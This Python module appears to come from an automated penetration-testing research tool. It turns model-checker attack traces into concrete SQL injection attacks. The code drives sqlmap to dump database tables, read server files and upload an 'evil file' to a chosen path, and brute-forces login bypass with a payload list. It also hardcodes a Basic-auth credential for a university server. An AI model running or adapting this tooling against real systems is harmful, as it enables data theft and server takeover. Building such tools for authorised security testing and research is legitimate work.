
#!/usr/local/bin/python3.5

"""
This module provides sql-injection extension
"""
import re
import json
import config
import requests
import linecache
import threading

from modules.logger import logger
from modules.wrapper import sqlmap
from modules.http import execute_request
from os.path import expanduser
from os.path import join
from os.path import isfile
from os import listdir

# --==[ SQL Injection ]==--
# 1: whenever I find a sqli somewhere, look for i -> webapp : tuple(of_the_same_sqli)
#    if found, data extraction is performed and thus inside the sqli array I'll have
#    and entry [a,idx] where idx is the line where the injection should be performed
# 2: if I don't perform a data extraction, a 0 should appear
# 3: sqli.lfi identifies a sql-injection for reading
# 4: sqli.evil_file identifies a sql-injection for writing
#


# Matrix form:
# [ ['a',[( tag_where_to_exploit, [ parameters_to_exploit ])]],
#         ['n',0]
#         ['e',0] ]
# Where  a: attack
#        n: normal request
#        e: exploit

"""
Understands sql-injection attacks on the message sequence chart.
msc_table: is the message sequence chart table
extended: is a JSON structure that extendes the msc_table for concretizing
            attacks
"""
def sqli(msc_table,extended):
    logger.debug("Starting extend_trace_sqli")
    sqli = []
    injection_point = ""

    # regexp 
    r_sqli           = re.compile("(?:.*?[^tuple(])sqli\.(?:.*)\.")
    r_tuple_response = re.compile("\((?:.*?)\)\.tuple\(")
    r_tuple_request  = re.compile("(?:.*?)tuple(:?.*?)\)")
    r_sqli_write     = re.compile("(?:.*?)sqli\.evil_file(?:.*?)\)")
    r_sqli_read      = re.compile("(?:.*?[^tuple(])sqli\.([a-z]*)\.")

    # second-order conditions
    cond1 = False # i -> webapp : <something>.sqli.<something>
    cond2 = False # i -> webapp : <something>
    cond3 = False # webapp -> i : tuple(<something>.sqli.<something>


    for idx, row in enumerate(msc_table):
        debugMsg = "row: {}".format(row)
        logger.debug(debugMsg)
        tag = row[0]
        step = row[1]
        sender = step[0]
        receiver = step[1]
        msg = step[2]

        debugMsg = "Processing {} - {}".format(tag,step)

        if sender not in config.receiver_entities:
            # is a message from the intruder
            if r_sqli_write.search(msg):
                # sqli for writing
                entry = {"attack":2}
                extended[tag] = entry
            else:
                f = r_sqli_read.search(msg)
                logger.debug(debugMsg)
                print(r_sqli)
                if f:
                    # sqli for reading
                    entry = {"attack":1,"params":{f.group(1)}}
                    extended[tag] = entry
                elif r_sqli.search(msg):
                    entry = {"attack":0}
                    extended[tag] = entry

        else:
            if r_tuple_response.search(msg):
                # we are exploiting a sqli
                param_regexp = re.compile(r'\.?([a-zA-Z]*?)\.tuple')
                params = param_regexp.findall(msg)
                # create a multiple array with params from different lines
                t = msc_table[injection_point][0]
                extended[t]["params"] = {tag:params}
                extended[tag] = {"attack": 6}
            else:
                if tag not in extended and tag != "tag":
                    extended[tag] = {"attack":-1}



def sqlmap_parse_data_extracted(sqlmap_output):
    global data_to_extract
    # Let's parse the data extracted
    debugMsg = "sqlmap output {}".format(sqlmap_output)
    logger.debug(debugMsg)
    extracted_values = {}
    debugMsg = "data to extract {}".format(data_to_extract)
    logger.debug(debugMsg)
    for tblcol in data_to_extract:
        debugMsg = "tblcol: ".format(tblcol)
        logger.debug(debugMsg)
        tbl_list = tblcol.split(".")
        debugMsg = "tbl_list[1]: ".format(tbl_list[1])
        logger.debug(debugMsg)
        tmp_table = tbl_list[0]
        tmp_column = tbl_list[1]
        try:
            extracted_values[tmp_table]
        except KeyError:
            extracted_values[tmp_table] = {}
        try:
            extracted_values[tmp_table][tmp_column] = sqlmap_output["data"][2]["value"][tmp_column]["values"]
        except Exception:
            logger.critical("error in the sqlmap output")
            sqlmap.kill
            exit()
        logger.debug("Ending sqlmap extraction")
        sqlmap.kill()
    return extracted_values



def execute_sqlmap(sqlmap_details):
    global data_to_extract
    url = sqlmap_details["url"]
    method = sqlmap_details["method"]
    params = sqlmap_details["params"]

    logger.info("run sqlmapapi.py")
    is_sqlmap_up = sqlmap.run_api_server()
    if not is_sqlmap_up:
        logger.critical("sqlmap server not running")
        exit()
    task = sqlmap.new_task()

    # hardcoded configuration for the univr server
    # TODO: make it configurable from the command line
    sqlmap.set_option("authType","Basic",task)
    sqlmap.set_option("authCred","regis:password",task)
    #sqlmap.set_option("dropSetCookie","false",task)

    # set cookie if present and should be considered
    if config.keep_cookie and config.cookies != None:
        c = ""
        for k,v in config.cookies.items():
            c = c + k + "=" + v + ";"
        debugMsg = "sqlmap with cookie {}".format(c)
        logger.debug(debugMsg)
        sqlmap.set_option("cookie",c,task)

    url_params = ""
    for k,v in params.items():
        url_params = url_params+k+"="+v+"&"
    url_params = url_params[:-1]
    if method == "GET":
        url = url+"?"+url_params
        sqlmap.set_option("url",url,task)
    elif method == "POST":
        sqlmap.set_option("url",url,task)
        sqlmap.set_option("data",url_params,task)

    try:
        data_to_extract = sqlmap_details["extract"]
        sqlmap.set_option("dumpTable","true",task)
        # set data extraction only if we have data to extract
        col = ""
        tbl = ""
        for tblcol in data_to_extract:
            tbl_list = tblcol.split(".")
            # TODO: in here we're basically overwriting the table name
            # whenever we find a new one
            tbl = tbl_list[0]
            col = col + tbl_list[1]
        sqlmap.set_option("tbl",tbl,task)
        sqlmap.set_option("col",col,task)
    except KeyError:
        pass
    try:
        file_to_extract = sqlmap_details["read"]
        # TODO: ask if you want to change the file or continue ?
        sqlmap.set_option("rFile",file_to_extract,task)
    except KeyError:
        pass
    try:

        file_to_write = sqlmap_details["write"]
        if not isfile(file_to_write):
            debug.critical("Error: evil file not found")
            exit()
        sqlmap.set_option("wFile",join(".",file_to_write),task)
        path = input("Where to upload the file?")
        sqlmap.set_option("dFile",path,task)
    except KeyError:
        pass

    logger.info("sqlmap analysis started")
    sqlmap.start_scan(url,task)

    stopFlag = threading.Event()
    sqlmap_output = ""
    while not stopFlag.wait(5):
        r = sqlmap.get_status(task)
        if "terminated" in r:
            logger.debug(sqlmap.get_log(task))
            logger.info("sqlmap analysisnalysis terminated")
            sqlmap_output = sqlmap.get_data(task)
            stopFlag.set()
        else:
            logger.debug(sqlmap.get_log(task))
            logger.info("sqlmap analysis in progress ... ")

    return sqlmap_output


def execute_bypass(s,request,check):
    # now let's inject the params
    # TODO: fix, we assume we only have one param with ?
    params = request["params"]
    for park, parv in params.items():
        if parv == "?":
            with open("modules/sqli/bypasspayloads.txt") as f:
                for line in f.readlines():
                    params[park] = line.rstrip()
                    r = execute_request(s,request)
                    if check in r.text:
                        return True
    return False


"""
retrieve the list of files extracted by sqlmap which are stored in
~/.sqlmap/output/[domain]/files
"""
def get_list_extracted_files(attack_domain):
    files_extracted = []
    debugMsg = "domain {}".format(attack_domain)
    logger.debug(debugMsg)
    __sqlmap_files_path = expanduser(join("~",".sqlmap","output",attack_domain,"files"))

    try:
        files = [f for f in listdir(__sqlmap_files_path) if isfile(join(__sqlmap_files_path,f))]
    except FileNotFoundError:
        criticalMsg = "File not found {}".format(__sqlmap_files_path)
        logger.critical(criticalMsg)
        logger.critical("Aborting execution")
        exit(0)
    for f in files:
        tmp = join( __sqlmap_files_path, f)
        files_extracted.append(tmp)
    return files_extracted
        #txt = open(join(__sqlmap_files_path,f))
        #print(txt.read())
